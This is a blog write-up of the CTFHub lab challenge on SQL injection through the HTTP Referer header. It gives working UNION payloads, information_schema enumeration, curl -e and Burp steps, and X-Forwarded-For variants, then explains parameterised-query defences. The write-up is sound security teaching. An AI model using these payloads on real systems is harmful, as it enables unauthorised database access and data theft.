---
layout: post
title: CTFHub - SQL Refer 注入 Writeup
platform: ctfhub
date: 2026-10-22 19:19:00 +0800
categories: CTF
---

CTFHub - SQL Refer 注入 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → Refer 注入）
- 题型：Web
- 考点：**注入点在 Referer 请求头**、UNION 联合查询、"禁止修改的请求头"


```text
页面标题：CTFHub 技能学习 | Refer注入
页面提示：请在referer输入ID            ← 直接告诉你在哪注入

★ 不带 Referer 访问首页：
    页面空白（SQL 变成 select * from news where id= ，语法错误）

★ 带上 Referer: 1：
    select * from news where id=1
    ID: 1
    Data: ctfhub
    → ★ 说明 Referer 的值被拼进了 SQL

★ 注入验证：

    Referer: 0 union select 1,2
    → Data: 2                      ✅ UNION 可用，2 个字段

★ 完整利用（又是随机表名/字段名）：

    Referer: 0 union select 1,database()
    → Data: sqli

    Referer: 0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()
    → Data: sqli:ycimolkpla:awnljvkmzy,sqli:news:id,sqli:news:data
                    └────┬────┘ └────┬────┘
                 目标表（随机）   目标字段（随机）

    Referer: 0 union select 1,group_concat(awnljvkmzy) from ycimolkpla
    → Data: ctfhub{a0075087b290ac6c70e09dd9}

    表里只有 1 行（count(*) → 1）

flag         : ctfhub{a0075087b290ac6c70e09dd9}
```

二、题目分析

**① 什么是 Referer**

```text
Referer 是 HTTP 请求头，告诉服务器"你从哪个页面跳过来的"

例：你在 A 页面点了一个链接到 B 页面
   浏览器请求 B 时会带上：
       Referer: http://a.com/page.html

网站为什么需要它：
   · 统计流量来源（从百度来的？从微信来的？）
   · 防盗链（图片只允许本站引用）
   · 安全校验（CSRF 防护有时校验 Referer）
```

**② 为什么 Referer 会被拼进 SQL**

**后端代码大概是这样**：

```php
$ref = $_SERVER['HTTP_REFERER'];
$sql = "select * from news where id=$ref";   // ★ 直接拼接
$result = mysqli_query($conn, $sql);
```

**真实场景**：网站记录"访问来源"时会这么写

```php
// 广告投放统计系统
$ref = $_SERVER['HTTP_REFERER'];
$sql = "insert into traffic_log(ref, ip, time) values('$ref', '$ip', now())";
```

**★ 和 UA 注入一模一样的原理**：用户可控的请求头被拼进了 SQL。

**③ ★ 关键难点：Referer 是"禁止修改的请求头"**

```text
浏览器的 Fetch/XHR 规范里有个"禁止修改的请求头"列表（forbidden header names）：

    Referer
    User-Agent
    Origin
    Host
    Cookie        ← （部分可以，但有限制）
    ...

★ 这些头【不允许 JS 通过 fetch/XMLHttpRequest 设置】
  （防止页面伪造来源绕过 CSRF 防护）

所以：
    · 在控制台里 fetch(..., {headers: {Referer: 'xxx'}})  → 被浏览器忽略 ❌
    · document.referrer = 'xxx'                          → 只读，改不了 ❌
```

**这就是为什么 Referer 注入基本只能用 Burp / curl / 代理来做** —— 它们是"自己构造原始 HTTP 请求"，不受浏览器限制。

**④ 本题和前面几题的对比**

| 注入点 | 浏览器能改吗 | 最方便的改法 |
|---|---|---|
| URL 参数 | ✅ | 地址栏 |
| POST body | ✅ | 表单 / DevTools |
| Cookie | ✅ | DevTools → 应用 |
| User-Agent | ✅ | DevTools → 网络条件 → 用户代理 |
| **Referer** | ❌ **不行** | **Burp / curl** |
| X-Forwarded-For | ❌ | Burp / curl |

三、解题步骤

**方法一：Burp Suite（推荐）**

**第 1 步：抓包**

```
① Burp → Proxy → Intercept is on
② 浏览器访问题目地址
    http://challenge-xxx:10800/
③ Burp 拦到请求：

    GET / HTTP/1.1
    Host: challenge-xxx:10800
    User-Agent: Mozilla/5.0 ...
    Accept: text/html,...
    
    ★ 注意：里面【没有 Referer】
```

**第 2 步：手动加一行 Referer**

```
在 User-Agent 下面（或任意请求头之间）加一行：

    Referer: 1

变成：

    GET / HTTP/1.1
    Host: challenge-xxx:10800
    User-Agent: Mozilla/5.0 ...
    Referer: 1
    Accept: text/html,...

点 Forward
```

**浏览器里显示**：

```
select * from news where id=1
ID: 1
Data: ctfhub
```

**📝 确认 Referer 生效了**（之前不带 Referer 时页面是空白的）

**第 3 步：换成注入 payload**

```
Referer: 0 union select 1,2
→ Data: 2            ✅
```

**第 4 步：★ 用 Repeater（效率关键）**

```
① 右键请求 → Send to Repeater（Ctrl+R）
② 切到 Repeater 标签
③ 左边只改 Referer 那一行 → 点 Send
④ 右边立刻看到响应
```

**★ Referer 注入必须用 Repeater** —— 因为每次都要手动加这一行，用 Proxy 反复抓包太累。

**第 5 步：爆库名**

```
Referer: 0 union select 1,database()
→ Data: sqli
```

**第 6 步：爆表名+字段名**

```
Referer: 0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()
→ Data: sqli:ycimolkpla:awnljvkmzy,sqli:news:id,sqli:news:data
```

**第 7 步：拿 flag**

```
Referer: 0 union select 1,group_concat(awnljvkmzy) from ycimolkpla
→ Data: ctfhub{a0075087b290ac6c70e09dd9}
```

**第 8 步：提交 flag → 通关**

---

**方法二：curl（更简单，一行搞定）**

```bash
BASE="http://challenge-xxx:10800"

# 正常请求（带 Referer: 1）
curl -s -e "1" "$BASE/"

# 注入：库名
curl -s -e "0 union select 1,database()" "$BASE/"

# 注入：表名+字段名
curl -s -e "0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()" "$BASE/"

# 注入：拿 flag
curl -s -e "0 union select 1,group_concat(awnljvkmzy) from ycimolkpla" "$BASE/"
```

**`-e` 参数就是设置 Referer**：

```bash
curl -e "你的payload" URL
# 等价于
curl -H "Referer: 你的payload" URL
```

**★ 本题实测用的就是这种方式**，输出：

```text
$ curl -s -e "0 union select 1,group_concat(awnljvkmzy) from ycimolkpla" "$BASE/"
<br/>ID: 1<br/>Data: ctfhub{a0075087b290ac6c70e09dd9}
```

---

**方法三：浏览器插件（不想开 Burp 的话）**

**推荐两个扩展**（Chrome / Edge 商店都有）：

| 插件 | 作用 | 用法 |
|---|---|---|
| **ModHeader** | 自由增删改任意请求头 | 添加一行 `Referer: payload` |
| **Header Editor** | 规则式改请求头 | 配置 URL 匹配 + 替换头 |

**操作（以 ModHeader 为例）**：

```
① 装 ModHeader → 点扩展图标
② 在 【Request headers】 里点 + 
③ Name 填：Referer
④ Value 填：0 union select 1,database()
⑤ 刷新页面 → 看 Data: sqli
⑥ 改 Value → 再刷新
```

**★ 优点**：像改 UA 一样简单，改完直接 F5
**缺点**：要装扩展（CTF 环境里可能不方便）

---

**四种方式对比**

| 方式 | 优点 | 缺点 |
|---|---|---|
| **Burp Repeater** | 最灵活，能看原始响应 | 要开 Burp，反复改略麻烦 |
| **curl -e** | 一行搞定，适合批量 | 看不了页面渲染效果 |
| **ModHeader 扩展** | 像改 UA 一样方便 | 要装扩展 |
| **DevTools** | — | ❌ **改不了 Referer**（禁止修改的头）|

四、延伸知识

**① "禁止修改的请求头"完整列表**

```text
根据 Fetch 规范，JS 不能设置的头：

    Accept-Charset
    Accept-Encoding
    Access-Control-Request-Headers
    Access-Control-Request-Method
    Connection
    Content-Length
    Cookie
    Cookie2
    Date
    DNT
    Expect
    Host
    Keep-Alive
    Origin
    Referer
    TE
    Trailer
    Transfer-Encoding
    Upgrade
    Via
    Proxy-*
    Sec-*

★ 这些头只能由【浏览器自己】决定
★ 所以改它们必须用代理工具（Burp/Charles）或 curl
```

**② 为什么 CTFHub 单独出 Refer 注入这关**

```text
目的：让你意识到"注入点可以在任何地方"

而且 Refer 注入有个特殊点：
    ★ 浏览器改不了它 → 必须用代理工具

这是从"用浏览器点点点"到"用 Burp 干活"的过渡
后面的 XFF 注入也是同理
```

**③ Referer 注现在实战中的意义**

```text
① 很多 WAF 只检查 URL 参数和 POST body
   → Referer / UA / XFF 是常见的绕过点

② Referer 常被存进"流量日志表"
   → 可以写入恶意数据（存储型风险）
   → 日志表往往权限宽松，可作跳板

③ 有些系统的"来源分析"页面会把 Referer 渲染出来
   → 可能组合出 XSS
```

**④ X-Forwarded-For 注入（下一篇可能就是）**

```text
后端可能用 XFF 记录"真实 IP"（用于 CDN 后面的服务器）：

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $sql = "insert into visit(ip) values('$ip')";

注入方式（Burp / curl 同样适用）：

    X-Forwarded-For: 0 union select 1,database()

curl 写法：
    curl -H "X-Forwarded-For: 0 union select 1,database()" URL
```

**⑤ 防护**

```text
· ★ 参数化查询（根本办法）
· 不要信任任何 HTTP 头：
    Referer / User-Agent / X-Forwarded-For / X-Real-IP / Accept-Language
· 日志类字段：
    · 长度截断（如只取前 200 字符）
    · 转义单引号（但参数化才是正道）
· WAF 要覆盖所有输入位置，不只是 URL 和 body
```

五、总结

- **本题核心：注入点换到了 `Referer` 请求头；payload 和 UNION 注入完全一样。**
- 三步定位：

```text
① 页面提示"请在referer输入ID"
② 不带 Referer → 页面空白；带 Referer: 1 → 正常显示
③ Referer: 0 union select 1,2 → Data: 2 → 注入确认
```

- 完整 payload（放在 Referer 头里）：

```text
Referer: 0 union select 1,database()
Referer: 0 union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database()
Referer: 0 union select 1,group_concat(awnljvkmzy) from ycimolkpla
```

- **三个必记要点**：

```text
① Referer 是"禁止修改的请求头"，浏览器 JS 改不了
   → 必须用 Burp / curl / 扩展

② 注入点可以在任何用户可控输入：
   URL / POST / Cookie / UA / Referer / X-Forwarded-For

③ 这题也是随机表名/字段名 → 还是得查 information_schema
```

```

**手工复现要点**：

```text
· 浏览器改不了 Referer（禁止修改的请求头）
· 最快的办法：Burp 抓包 → 手动加一行 Referer → Send to Repeater → 反复改
· 或者一行命令：curl -e "payload" URL
· 想用浏览器直接改的话，装 ModHeader 扩展
```
